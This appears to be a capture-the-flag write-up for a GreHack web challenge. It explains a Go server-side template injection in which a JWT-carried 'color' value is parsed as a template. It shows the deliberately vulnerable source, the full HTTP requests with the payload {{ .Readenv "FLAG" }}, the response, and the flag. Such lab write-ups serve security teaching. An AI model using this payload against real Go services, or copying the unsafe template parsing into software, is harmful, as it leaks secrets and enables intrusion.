# Gogo Power Rangers - Web easy

Source code:

```go
package main

import (
    "bytes"
    "html/template"
    "log"
    "net/http"
    "os"
    "runtime/debug"

    "github.com/golang-jwt/jwt"
    "github.com/joho/godotenv"
)

type Claims struct {
    Color string `json:"color"`
    jwt.StandardClaims
}

type dummyObj struct {
    data string
}

func (obj *dummyObj) Readenv(key string) string {
    return os.Getenv(key)
}

func recoveryMiddleware(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        defer func() {
            if err := recover(); err != nil {
                log.Printf("Panic recovered: %v", err)
                debugStack := string(debug.Stack())
                log.Printf("Stack Trace: \n%s\n", debugStack)
                http.Error(w, "Internal Server Error", http.StatusInternalServerError)
            }
        }()
        next.ServeHTTP(w, r)
    })
}

func ColorSelection(w http.ResponseWriter, r *http.Request) {
    // debug
    err := r.ParseForm()
    if err != nil {
        log.Println("Failed to parse form:", err)
        w.WriteHeader(http.StatusBadRequest)
        return
    }

    if r.Method == "POST" {
        color := r.FormValue("color")
        claims := &Claims{
            Color: color,
        }

        token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)
        tokenString, err := token.SignedString([]byte(os.Getenv("JWT_SECRET")))
        if err != nil {
            w.WriteHeader(http.StatusInternalServerError)
            return
        }

        http.SetCookie(w, &http.Cookie{
            Name:  "token",
            Value: tokenString,
        })

        // Add the personalized message
        var sentence string
        switch color {
        case "red":
            sentence = "Strength and Power!"
        case "blue":
            sentence = "Wisdom and Intelligence!"
        case "yellow":
            sentence = "Compassion and Speed!"
        case "green":
            sentence = "Mystery and Stealth!"
        case "pink":
            sentence = "Grace and Flexibility!"
        default:
            sentence = "Welcome, " + color + " Ranger!"
        }

        w.Write([]byte(sentence))

    } else if r.Method == "GET" {
        c, err := r.Cookie("token")
        if err != nil {
            if err == http.ErrNoCookie {
                t, _ := template.ParseFiles("colors.html")
                t.Execute(w, nil)
                return
            }
            w.WriteHeader(http.StatusBadRequest)
            return
        }

        tknStr := c.Value
        claims := &Claims{}

        tkn, err := jwt.ParseWithClaims(tknStr, claims, func(token *jwt.Token) (interface{}, error) {
            return []byte(os.Getenv("JWT_SECRET")), nil
        })

        if err != nil {
            if err == jwt.ErrSignatureInvalid {
                w.WriteHeader(http.StatusUnauthorized)
                return
            }
            w.WriteHeader(http.StatusBadRequest)
            return
        }

        if !tkn.Valid {
            w.WriteHeader(http.StatusUnauthorized)
            return
        }

        dumObj := &dummyObj{
            data: "data",
        }

        colorTemplate := claims.Color

        tmpl, err := template.New("color").Parse(colorTemplate)
        if err != nil {
            w.WriteHeader(http.StatusInternalServerError)
            return
        }

        var tpl bytes.Buffer
        log.Println(dumObj)
        err = tmpl.Execute(&tpl, dumObj)
        if err != nil {
            w.WriteHeader(http.StatusInternalServerError)
            return
        }

        parsedColorTemplate := tpl.String()

        data := struct {
            Greeting            string
            dumObj              *dummyObj
            ParsedColorTemplate string
        }{
            Greeting:            "Welcome, Ranger!",
            dumObj:              dumObj,
            ParsedColorTemplate: parsedColorTemplate,
        }

        t, _ := template.ParseFiles("colors.html")
        t.ExecuteTemplate(w, "colors.html", data)
    }
}

func main() {
    err := godotenv.Load()
    if err != nil {
        panic("Failed to load env file")
    }

    port := os.Getenv("PORT")
    if port == "" {
        log.Fatal("$PORT must be set")
    }

    http.HandleFunc("/", ColorSelection)
    http.Handle("/static/", http.StripPrefix("/static/", http.FileServer(http.Dir("static"))))

    http.ListenAndServe(":"+port, recoveryMiddleware(http.DefaultServeMux))
}
```

We can see the `html/template` in imports, it's probably a SSTI in Go (https://www.onsecurity.io/blog/go-ssti-method-research/).

Now we can read the full code:

```go
type dummyObj struct {data string}
func (obj *dummyObj) Readenv(key string) string {return os.Getenv(key)}

// in main:
http.HandleFunc("/", ColorSelection)
// The root URI call the ColorSelection function

// in ColorSelection:
err := r.ParseForm()
// Parse form data
if r.Method == "POST" {
    color := r.FormValue("color")
    claims := &Claims{Color: color}
    token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)
    ...
    http.SetCookie(w, &http.Cookie{Name:  "token", Value: tokenString})
    ...
} else if r.Method == "GET" {
    c, err := r.Cookie("token")
    ...
    tknStr := c.Value
    claims := &Claims{}
    tkn, err := jwt.ParseWithClaims(tknStr, claims, func(token *jwt.Token) (interface{}, error) {return []byte(os.Getenv("JWT_SECRET")), nil})
    ...
    dumObj := &dummyObj{data: "data"}
    colorTemplate := claims.Color
    tmpl, err := template.New("color").Parse(colorTemplate)
    ...
    err = tmpl.Execute(&tpl, dumObj)
    ...
    data := struct {Greeting string, dumObj *dummyObj, ParsedColorTemplate string}{Greeting: "Welcome, Ranger!", dumObj: dumObj, ParsedColorTemplate: parsedColorTemplate}
    t, _ := template.ParseFiles("colors.html")
    t.ExecuteTemplate(w, "colors.html", data)
// Check if a POST request and create a JWT token as cookie with the value of color form value
// Check if a GET request and parse the JWT color field as a template and write the return value in response
```

Okay, so to exploit it we can create a cookie with a POST request and read the result with GET request, we can use the `Readenv` function to get the `FLAG` environment variable:

```
POST / HTTP/2
Host: gogo-power-rangers.ctf.grehack.fr
Content-Length: 27
Sec-Ch-Ua: "Chromium";v="117", "Not;A=Brand";v="8"
Accept: */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36
Sec-Ch-Ua-Platform: "Linux"
Origin: https://gogo-power-rangers.ctf.grehack.fr
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://gogo-power-rangers.ctf.grehack.fr/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9

color={{ .Readenv "FLAG" }}
```

```
GET / HTTP/2
Host: gogo-power-rangers.ctf.grehack.fr
Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjb2xvciI6Int7IC5SZWFkZW52IFwiRkxBR1wiIH19In0.DZWuE9XRBvmocizaSIWBBwpW97_FceAni855gyIXJk4
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="117", "Not;A=Brand";v="8"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
```

And get the response:

```
HTTP/2 200 OK
Alt-Svc: h3=":443"; ma=2592000
Content-Type: text/html; charset=utf-8
Date: Sat, 18 Nov 2023 11:56:58 GMT
Server: Caddy

<!DOCTYPE html>
<html>

<head>
    <title>Go Go Power Rangers !</title>
    <script src="/static/js/jquery.min.js"></script>
    <link rel="stylesheet" href="/static/css/main.css">
    <link rel="shortcut icon" href="/static/img/favicon.ico" type="image/x-icon">
</head>

<body>
    <div class="container">
        <div class="form-header">
            <h2>Select your Ranger color</h2>
        </div>
        <form id="colorForm" method="POST" action="/colors">
            <select class="form-control" name="color" id="colorSelection">
                <option value="unknown">Unknown Ranger</option>
                <option value="red">Red Ranger</option>
                <option value="blue">Blue Ranger</option>
                <option value="yellow">Yellow Ranger</option>
                <option value="green">Green Ranger</option>
                <option value="pink">Pink Ranger</option>
            </select>
            <button type="submit" class="submit-btn">Select</button>
        </form>
        <div class="greeting" id="greetingMessage">
            Welcome, Ranger!
            GH{Goo_Gooo_P0w3r_R4ng3333rs!!}
        </div>
        <div class="ranger-image" id="rangerImage"></div>
    </div>
    <script>
        $(document).ready(function() {
            var bodyElement = $('body');
            var greetingElement = $('.greeting');
            var button = $('.btn');
            var colorSelectionElement = $('#colorSelection');
            var rangerImageElement = $('#rangerImage');
            var title = $('.form-header');

            function setColorTheme(color) {
                switch (color) {
                    case 'red':
                        rangerImageElement.css('background-image', 'url("/static/img/red_ranger.png")');
                        rangerImageElement.css('border', '2px solid red');
                        greetingElement.css('color', 'red');
                        greetingElement.css('border', '2px solid red');
                        button.css('background-color', 'red');
                        title.css('color', 'red');
                        break;
                    case 'blue':
                        rangerImageElement.css('background-image', 'url(/static/img/blue_ranger.png)');
                        rangerImageElement.css('border', '2px solid blue');
                        greetingElement.css('color', 'blue');
                        greetingElement.css('border', '2px solid blue');
                        button.css('background-color', 'blue');
                        title.css('color', 'blue');
                        break;
                    case 'yellow':
                        rangerImageElement.css('background-image', 'url(/static/img/yellow_ranger.png)');
                        rangerImageElement.css('border', '2px solid yellow');
                        greetingElement.css('color', 'yellow');
                        greetingElement.css('border', '2px solid yellow');
                        button.css('background-color', 'yellow');
                        title.css('color', 'yellow');
                        break;
                    case 'green':
                        rangerImageElement.css('background-image', 'url(/static/img/green_ranger.png)');
                        rangerImageElement.css('border', '2px solid green');
                        greetingElement.css('color', 'green');
                        greetingElement.css('border', '2px solid green');
                        button.css('background-color', 'green');
                        title.css('color', 'green');
                        break;
                    case 'pink':
                        rangerImageElement.css('background-image', 'url(/static/img/pink_ranger.png)');
                        rangerImageElement.css('border', '2px solid pink');
                        greetingElement.css('color', 'pink');
                        greetingElement.css('border', '2px solid pink');
                        button.css('background-color', 'pink');
                        title.css('color', 'pink');
                        break;
                    default:
                        rangerImageElement.css('background-image', '');
                        greetingElement.css('color', 'black');
                }
            }

            $("#colorForm").on("submit", function(event) {
                event.preventDefault();

                var formData = $(this).serialize();
                var colorSelectionValue = colorSelectionElement.val();
                $.ajax({
                    url: '/',
                    type: 'POST',
                    data: formData,
                    success: function(data) {
                        $("#greetingMessage").html(data);
                        setColorTheme(colorSelectionValue);
                    }
                });
            });
        });
    </script>

</body>

</html>
```

Flag is: `GH{Goo_Gooo_P0w3r_R4ng3333rs!!}`.